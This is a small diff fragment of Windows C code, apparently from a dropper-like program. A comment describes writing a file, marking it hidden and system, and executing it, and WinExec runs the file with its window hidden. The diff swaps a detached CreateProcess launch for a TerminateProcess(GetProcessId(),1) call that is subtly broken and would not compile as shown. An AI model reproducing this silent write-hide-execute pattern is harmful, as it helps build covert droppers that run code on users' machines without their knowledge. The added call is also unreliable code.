@@ -117,9 +117,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			CloseHandle(tmphnd);
 			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
 			WinExec(filename,0);
-			STARTUPINFO si;
-			PROCESS_INFORMATION pi;
-			CreateProcess(filename,NULL,NULL,NULL,TRUE,DETACHED_PROCESS,NULL,tempspace,&si,&pi);
+			TerminateProcess(GetProcessId(),1);
 		}
 		break;
         case WM_CLOSE:
